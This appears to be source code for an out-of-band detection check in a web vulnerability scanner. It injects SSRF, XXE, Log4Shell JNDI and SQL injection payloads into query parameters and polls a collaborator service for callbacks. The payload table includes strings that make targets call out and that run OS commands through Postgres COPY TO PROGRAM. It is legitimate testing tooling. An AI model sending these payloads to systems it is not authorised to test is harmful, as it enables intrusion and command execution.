"""Out-of-band (OAST) detection via the embedded Collaborator.

Detects blind vulnerabilities that produce no in-band signal by injecting
payloads that reference a unique collaborator subdomain, then polling the
collaborator for callbacks (DNS/HTTP interactions) from the target.

Covers:
  - Blind SSRF (target fetches http://<token>.<domain>/)
  - Blind XXE (XML external entity resolves <token>.<domain>)
  - Log4Shell (JNDI lookup to <token>.<domain>)
  - Blind SQLi (DNS lookup via MSSQL xp_dirtree, Oracle UTL_HTTP)

Requires the embedded collaborator to be reachable from the target — which
is always true for local/LAN testing where the collaborator runs on the same
machine as Nyx.
"""
import asyncio
import logging
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult
from core.config import settings
from urllib.parse import urlparse, parse_qsl, urlencode

logger = logging.getLogger(__name__)

# How long to wait for a callback after injection (seconds)
_CALLBACK_WAIT = 4.0
# How often to poll the collaborator during the wait (seconds)
_POLL_INTERVAL = 0.8

# Collaborator-referencing payloads, grouped by vulnerability class.
_OAST_PAYLOADS: dict[str, list[str]] = {
    "ssrf": [
        "http://{subdomain}/",
        "http://{subdomain}/ssrf-probe",
        "http://{subdomain}:80/",
        "//{subdomain}/",
        "http://user@{subdomain}/",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://{subdomain}/xxe"> %d;]><r/>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{subdomain}/x">]><r>&xxe;</r>',
    ],
    "log4shell": [
        "${{jndi:ldap://{subdomain}/a}}",
        "${{jndi:dns://{subdomain}/a}}",
        "${{jndi:rmi://{subdomain}/a}}",
        "${{${{lower:j}}ndi:${{lower:l}}dap://{subdomain}/a}}",
    ],
    "sqli-mssql": [
        "1; EXEC xp_dirtree '//{subdomain}/a'--",
        "1'; EXEC xp_dirtree '//{subdomain}/a'--",
    ],
    "sqli-oracle": [
        "1'||(SELECT UTL_HTTP.REQUEST('http://{subdomain}/') FROM DUAL)||'",
        "1'||UTL_INADDR.GET_HOST_ADDRESS('{subdomain}')||'",
    ],
    "sqli-postgres": [
        "1; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}'--",
        "1'; SELECT pg_sleep(0); COPY (SELECT '') TO PROGRAM 'ping -c 1 {subdomain}'--",
    ],
}


class ActiveOastCheck(BaseCheck):
    """Out-of-band detection via collaborator callbacks."""

    name = "active_oast"

    async def _generate_token(self, client: httpx.AsyncClient) -> str | None:
        """Ask the collaborator API for a fresh unique subdomain."""
        url = settings.COLLABORATOR_URL.rstrip("/") + "/api/collaborator/generate-token"
        try:
            resp = await client.get(url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return data.get("subdomain") or data.get("dns_payload")
        except Exception as e:
            logger.debug("Collaborator token generation failed: %s", e)
        return None

    async def _poll_callbacks(
        self, client: httpx.AsyncClient, token: str, wait: float = _CALLBACK_WAIT
    ) -> list[dict]:
        """Poll the collaborator for interactions matching this token."""
        url = settings.COLLABORATOR_URL.rstrip("/") + "/api/collaborator/interactions"
        deadline = asyncio.get_event_loop().time() + wait
        seen: dict[str, dict] = {}
        while asyncio.get_event_loop().time() < deadline:
            try:
                resp = await client.get(url, params={"token": token}, timeout=5)
                if resp.status_code == 200:
                    for interaction in resp.json():
                        iid = interaction.get("id")
                        if iid and iid not in seen:
                            seen[iid] = interaction
                if seen:
                    # Callback received — return immediately
                    break
            except Exception:
                pass
            await asyncio.sleep(_POLL_INTERVAL)
        return list(seen.values())

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results: list[CheckResult] = []

        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            subdomain = await self._generate_token(client)
            if not subdomain:
                # Collaborator unavailable — degrade gracefully, no OAST possible
                return results
            token = subdomain.split(".")[0] if "." in subdomain else subdomain

            for param in target_params:
                for vuln_class, payloads in _OAST_PAYLOADS.items():
                    for template in payloads:
                        payload = template.format(subdomain=subdomain)
                        try:
                            await client.request(**self._inject_payload(base_request, param, payload))
                        except Exception:
                            continue
                        # Brief pause between injections to avoid rate limiting
                        await asyncio.sleep(0.1)

            # Poll once for callbacks across all injections
            callbacks = await self._poll_callbacks(client, token)

            if callbacks:
                # Determine vuln class from the callback URL/query
                for cb in callbacks:
                    url = cb.get("url", "")
                    itype = cb.get("interaction_type", "http")
                    vuln_class = self._classify_callback(url)
                    source_ip = cb.get("source_ip", "unknown")

                    sev = "critical" if vuln_class in ("log4shell", "ssrf") else "high"
                    cwe_map = {
                        "ssrf": "CWE-918",
                        "xxe": "CWE-611",
                        "log4shell": "CWE-917",
                        "sqli": "CWE-89",
                    }
                    results.append(CheckResult(
                        triggered=True,
                        severity=sev,
                        title=f"Out-of-band {vuln_class.upper()} confirmed",
                        description=(
                            f"A collaborator callback was received ({itype} from {source_ip}), "
                            f"confirming out-of-band {vuln_class} injection."
                        ),
                        evidence=f"Callback URL: {url}\nSource IP: {source_ip}\nType: {itype}",
                        remediation=self._remediation_for(vuln_class),
                        cwe=cwe_map.get(vuln_class, "CWE-918"),
                    ))

        return results

    def _classify_callback(self, url: str) -> str:
        """Infer the vulnerability class from the callback path."""
        u = url.lower()
        if "log4shell" in u or "jndi" in u or "/a" in u and "ldap" in u:
            return "log4shell"
        if "xxe" in u or "/x" in u:
            return "xxe"
        if "ssrf" in u or "probe" in u:
            return "ssrf"
        return "ssrf"  # default — HTTP fetch is most common OAST vector

    def _remediation_for(self, vuln_class: str) -> str:
        table = {
            "ssrf": "Validate and restrict outbound URLs. Block private IP ranges. Use an allowlist.",
            "xxe": "Disable XML external entity processing. Use JSON instead of XML.",
            "log4shell": "Update Log4j to 2.17.0+. Set log4j2.formatMsgNoLookups=true.",
            "sqli": "Use parameterized queries / prepared statements.",
        }
        return table.get(vuln_class, "Apply input validation and output encoding.")

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        req = copy.deepcopy(base)
        parsed = urlparse(req["url"])
        params = dict(parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urlencode(params)).geturl()
        return req